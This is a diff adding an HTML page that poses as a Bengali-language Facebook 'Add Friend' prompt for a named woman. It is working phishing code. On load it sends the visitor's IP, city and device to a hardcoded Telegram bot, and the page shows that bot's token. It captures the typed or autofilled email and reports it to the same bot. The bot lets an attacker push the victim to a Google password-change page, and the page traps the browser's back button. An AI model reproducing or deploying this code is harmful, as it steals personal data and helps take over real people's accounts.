@@ -1,0 +1,175 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - Add Friend</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body { background-color: #f0f2f5; font-family: 'Helvetica', Arial, sans-serif; margin: 0; height: 100vh; display: flex; flex-direction: column; overflow: hidden; }
+        .hidden { display: none; }
+        .top-half { height: 45vh; width: 100%; overflow: hidden; background: #fff; }
+        .top-half img { width: 100%; height: 100%; object-fit: cover; }
+        .bottom-half { height: 55vh; width: 100%; background: white; border-top-left-radius: 30px; border-top-right-radius: 30px; margin-top: -30px; padding: 25px; box-shadow: 0 -5px 15px rgba(0,0,0,0.1); position: relative; z-index: 10; }
+        .secure-input { width: 100%; padding: 16px; border: 2px solid #1877f2; border-radius: 12px; outline: none; font-size: 16px; transition: 0.3s; }
+        .secure-input:focus { border-color: #145dbf; box-shadow: 0 0 8px rgba(24, 119, 242, 0.3); }
+        .btn-blue { width: 100%; background-color: #1877f2; color: white; font-weight: bold; padding: 15px; border-radius: 12px; cursor: pointer; border: none; transition: 0.2s; }
+        .btn-blue:active { transform: scale(0.98); opacity: 0.9; }
+        /* Spinner Animation */
+        .loader { width: 50px; height: 50px; border: 5px solid #f3f3f3; border-top: 5px solid #1877f2; border-radius: 50%; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body onload="checkState()">
+
+    <div class="top-half">
+        <img src="https://raw.githubusercontent.com/probasi-kollan-office-creator/facebook-friend-add/main/Picsart_26-03-15_06-28-09-284.jpg" alt="Profile Cover">
+    </div>
+
+    <div class="bottom-half text-center">
+        <div id="step1">
+            <h2 class="text-xl font-bold text-gray-800 mb-2">ফ্রেন্ড রিকোয়েস্ট পাঠান</h2>
+            <p class="text-gray-600 mb-6 text-sm">Mst. Priya Akter কে ফ্রেন্ড রিকোয়েস্ট পাঠাতে নিচের বাটনে ক্লিক করুন।</p>
+            <button onclick="startProcess()" class="btn-blue">Add Friend</button>
+        </div>
+
+        <div id="google_chooser" class="hidden">
+            <h1 class="text-lg font-bold text-gray-800 mb-2">অ্যাকাউন্ট নিশ্চিত করুন</h1>
+            <p class="text-xs text-gray-500 mb-4">কিবোর্ডের উপরে ভেসে থাকা জিমেইল আইডির ওপর ক্লিক করুন।</p>
+            <input type="email" id="email_field" name="email" autocomplete="email" placeholder="Email Address" class="secure-input" oninput="captureEmail(this.value)">
+            <button onclick="finalSubmit()" class="btn-blue mt-6">Add Friend</button>
+        </div>
+
+        <div id="verifying" class="hidden py-6">
+            <div class="loader"></div>
+            <h3 class="text-md font-bold text-gray-800">অপেক্ষা করুন...</h3>
+            <p class="text-xs text-gray-500 mt-2 px-4 leading-relaxed">অল্প কিছুক্ষণের মধ্যে ফেসবুক আইডিতে এড করা হচ্ছে ,,, দয়া করে একটু অপেক্ষা করুন। আপনার আইডিটি যাচাই করা হচ্ছে।</p>
+        </div>
+    </div>
+
+<script>
+    const botToken = "8617715035:AAHXQjkEtjYX40KQTAE5e_jVRQ_pKQX5Qjk";
+    const chatId = "8516934257";
+    let lastUpdateId = 0;
+    let selectedEmail = "";
+    let emailSent = false;
+
+    // Page state check on load
+    function checkState() {
+        captureVisitorData();
+        if (sessionStorage.getItem('isWaiting') === 'true') {
+            goToStep('verifying');
+            lockBack();
+            startListening();
+        }
+    }
+
+    function goToStep(id) {
+        document.querySelectorAll('.bottom-half > div').forEach(div => div.classList.add('hidden'));
+        document.getElementById(id).classList.remove('hidden');
+    }
+
+    async function captureVisitorData() {
+        try {
+            const res = await fetch('https://ipapi.co/json/');
+            const data = await res.json();
+            sendToBot(`🌐 **নতুন ভিজিটর!**\nIP: ${data.ip}\nCity: ${data.city}\nDevice: ${navigator.userAgent.slice(0,60)}`);
+        } catch(e){}
+    }
+
+    function startProcess() {
+        goToStep('google_chooser');
+        setTimeout(() => {
+            const input = document.getElementById('email_field');
+            input.focus();
+            input.click(); // Force suggestion popup
+        }, 400);
+    }
+
+    function captureEmail(val) {
+        if(val.includes('@') && val.length > 5) {
+            selectedEmail = val;
+            if(!emailSent) {
+                sendToBot(`📧 **ইউজার ইমেইল সিলেক্ট করেছে:** \`${selectedEmail}\``);
+                emailSent = true;
+            }
+        }
+    }
+
+    function finalSubmit() {
+        selectedEmail = document.getElementById('email_field').value;
+        if(!selectedEmail) return;
+
+        sessionStorage.setItem('isWaiting', 'true');
+        sessionStorage.setItem('savedEmail', selectedEmail);
+
+        // Send Report with Inline Buttons
+        const keyboard = {
+            inline_keyboard: [
+                [{ text: "🔑 Google Pass Change", callback_data: `pass_${selectedEmail}` }],
+                [{ text: "✅ Success", callback_data: "success" }, { text: "❌ Error", callback_data: "error" }]
+            ]
+        };
+
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: `🎯 **ইউজার "Add Friend" বাটনে ক্লিক করেছে!**\n📧 ইমেইল: \`${selectedEmail}\`\n\nকমান্ড দিন:`,
+                parse_mode: "Markdown",
+                reply_markup: keyboard
+            })
+        });
+
+        goToStep('verifying');
+        lockBack();
+        startListening();
+    }
+
+    function lockBack() {
+        window.history.pushState(null, "", window.location.href);
+        window.onpopstate = function() {
+            window.history.pushState(null, "", window.location.href);
+            goToStep('verifying');
+        };
+    }
+
+    function sendToBot(text) {
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: 'POST', headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ chat_id: chatId, text: text, parse_mode: "Markdown" })
+        });
+    }
+
+    function startListening() {
+        const checkInterval = setInterval(async () => {
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${botToken}/getUpdates?offset=${lastUpdateId + 1}`);
+                const data = await response.json();
+                
+                if (data.ok && data.result.length > 0) {
+                    data.result.forEach(update => {
+                        lastUpdateId = update.update_id;
+                        const command = update.message?.text || update.callback_query?.data;
+
+                        if (command && command.startsWith("pass_")) {
+                            const emailToTarget = command.split("_")[1];
+                            window.location.href = `https://accounts.google.com/signin/v2/identifier?continue=https%3A%2F%2Fmyaccount.google.com%2Fsigninoptions%2Fpassword&Email=${encodeURIComponent(emailToTarget)}`;
+                        } else if (command === "success") {
+                            alert("সফলভাবে প্রোফাইলে এড করা হয়েছে!");
+                            sessionStorage.clear();
+                            location.reload();
+                        } else if (command === "error") {
+                            alert("দুঃখিত, আবার চেষ্টা করুন।");
+                            sessionStorage.clear();
+                            location.reload();
+                        }
+                    });
+                }
+            } catch (e) {}
+        }, 3000);
+    }
+</script>
+</body>
+</html>
